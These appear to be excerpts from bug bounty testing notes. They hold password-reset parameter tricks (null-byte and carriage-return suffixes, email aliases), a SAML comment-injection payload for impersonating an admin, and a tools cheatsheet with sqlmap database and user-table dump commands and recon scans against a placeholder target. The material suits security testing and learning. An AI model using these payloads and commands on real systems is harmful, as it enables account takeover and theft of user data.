...
```
/reset-password?email=<MASKED_EMAIL>%00
/reset-password?email=<MASKED_EMAIL>%0d
/reset-password?email=<MASKED_EMAIL>    # Gmail ignores +alias
/reset-password?email=<MASKED_EMAIL>    # Different string, same inbox
```
...
```xml
<!-- Original: <MASKED_EMAIL> -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: <MASKED_EMAIL> -->
<!-- SAML validator sees "<MASKED_EMAIL>" (before comment) -->
<!-- Application uses "<MASKED_EMAIL>" (after comment stripped) -->
```
...
## APPENDIX B: TOOLS CHEATSHEET (Merged from bb-tools-essentials)

### 1. Burp Suite / OWASP ZAP (Proxy & Intercept)
* Intercept, Repeater, Intruder, Spider/Crawler, Active Scan.
* Use case: Intercept & replay HTTP requests for SQLi, XSS, IDOR, SSRF, Command Injection.

### 2. SQLMap (Automated SQLi)
* Scan URL: `sqlmap -u "http://target.com/page?id=1" --batch`
* Scan from Burp request: `sqlmap -r request.txt --batch`
* Dump DBs: `sqlmap -u "http://target.com/page?id=1" --dbs`
* Dump Table: `sqlmap -u "http://target.com/page?id=1" -D db_name -T users --dump`

### 3. ffuf (Directory & Parameter Fuzzing)
* Directory discovery: `ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302`
* Parameter discovery: `ffuf -u https://target.com/api?FUZZ=test -w params.txt -fs 404`

### 4. GoBuster (Dir & DNS discovery)
* Directory scan: `gobuster dir -u https://target.com -w common.txt`
* DNS scan: `gobuster dns -d target.com -w subdomains.txt`

### 5. Subfinder (Subdomain Enum)
* Run search: `subfinder -d target.com -o subdomains.txt -silent`

### 6. Amass (Deep Subdomain Enum)
* Run search: `amass enum -passive -d target.com`

### 7. Nmap (Port Scanning)
* Common ports scan: `nmap -p 80,443,8080,8443,3000,5000,8000 -sV target.com`
